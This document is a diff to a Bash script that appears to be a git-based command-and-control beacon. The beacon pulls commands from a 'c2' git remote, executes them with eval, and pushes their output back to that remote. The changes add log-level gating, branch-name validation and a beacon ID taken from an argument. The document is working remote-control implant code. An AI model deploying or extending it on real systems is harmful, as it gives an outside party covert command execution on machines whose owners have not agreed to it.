@@ -48,14 +48,14 @@ _cleanup () {
 	printf '\n'
 	if logif 0
 	then
-		warn "Cleaning up..."
+		logif 2 && warn "Cleaning up..."
 		_grey
 			cd /
-			rm -rfv -- "${tmpdir}" |& xargs || { err "error deleting tmpdir"; }
+			rm -rfv -- "${tmpdir}" |& xargs || { logif 3 && err "error deleting tmpdir"; }
 			cd -- "${orig_dir}" || cd || cd -- "${HOME}" || cd -- ~ || pwd
 		_rst
 	fi
-	warn "Exiting"
+	logif 2 && warn "Exiting"
 }
 
 # Override git command to make it LOGLEVEL aware
@@ -90,9 +90,9 @@ _fetch_next_command () {
 	id_file="${1}"
 
 	_check_ref "${BEACON_ID}" \
-		|| { warn "Pull failed (ref '${BEACON_ID}' doesnt exist)"; return 1; }
+		|| { logif 2 && warn "Pull failed (ref '${BEACON_ID}' doesnt exist)"; return 1; }
 	git pull c2 -- "${BEACON_ID}" \
-		|| { warn "Pull failed"; return 1; }
+		|| { logif 2 && warn "Pull failed"; return 1; }
 	cmd_id="$(comm -23 <(command git log --author=in --format=%ae | sort) <(command git log --author=out --format=%ae | sort) | sort -n | head -1)"
 	[ -n "${cmd_id}" ] || return 1
 	printf '%s' "${cmd_id}" 1>| "${id_file:-cmd_id}"
@@ -127,7 +127,7 @@ _send_result () {
 	git clean -df
 
 	git push c2 -- "${BEACON_ID}" \
-		|| { warn "Push failed"; return 1; }
+		|| { logif 2 && warn "Push failed"; return 1; }
 }
 
 # TODO: Make asynchronous, you don't want to lose the
@@ -146,19 +146,34 @@ _fetch_eval () {
 	_send_result "${cmd}" stdout stderr "${status}" "${pipestatus[*]@A}" "${elapsed}" cmd_id
 }
 
+_is_valid_branch_name () {
+	case "${1}" in
+		(*[^abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789._/-]*|"") false ;;
+	esac
+}
+
 init () {
 	trap _cleanup EXIT
 
 	LOGLEVEL="$((LOGLEVEL + 0))"
 	C2="git@vogsphere.42berlin.de:vogsphere/intra-uuid-17a60d50-65e8-4462-b546-c09f7a20c21c-5663399-tischmid"
-	BEACON_ID="$(hostname -s)" || BEACON_ID="${HOSTNAME%%.*}"
-	[ -n "${BEACON_ID}" ] || { err "error setting beacon id"; exit 1; }
+	if _is_valid_branch_name "${1}"
+	then
+		BEACON_ID="${1}"
+	else
+		BEACON_ID="$(hostname -s)" || BEACON_ID="${HOSTNAME%%.*}"
+		if ! _is_valid_branch_name "${BEACON_ID}"
+		then
+			logif 4 && fatal "error setting beacon id"
+			exit 1
+		fi
+	fi
 	POLL_RATE="5"
 	unset CDPATH
 
-	tmpdir="$(mktemp -d -p /tmp .gitc2beaconXXXXXXXXX)" || { err "error creating tmpdir"; exit 1; }
-	orig_dir="$(pwd)" || { warn "error changing to tmpdir (not exiting)"; }
-	cd -- "${tmpdir}" || { err "error changing to tmpdir"; exit 1; }
+	tmpdir="$(mktemp -d -p /tmp .gitc2beaconXXXXXXXXX)" || { logif 4 && fatal "error creating tmpdir"; exit 1; }
+	orig_dir="$(pwd)" || { logif 3 && err "error saving original dir"; }
+	cd -- "${tmpdir}" || { logif 4 && fatal "error changing to tmpdir"; exit 1; }
 
 	git init
 	git remote add c2 -- "${C2}"
@@ -174,7 +189,7 @@ init () {
 	else
 		git branch --move -- "${BEACON_ID}"
 	fi
-	[ "$(command git branch --show-current)" = "${BEACON_ID}" ] || { fatal "Failed to be on '${BEACON_ID}' branch! Exiting"; exit 1; }
+	[ "$(command git branch --show-current)" = "${BEACON_ID}" ] || { logif 4 && fatal "Failed to be on '${BEACON_ID}' branch! Exiting"; exit 1; }
 	if logif 0
 	then
 		_grey
@@ -198,8 +213,8 @@ loop () {
 }
 
 main () {
-	init
+	init "${@}"
 	loop
 }
 
-main
+main "${@}"
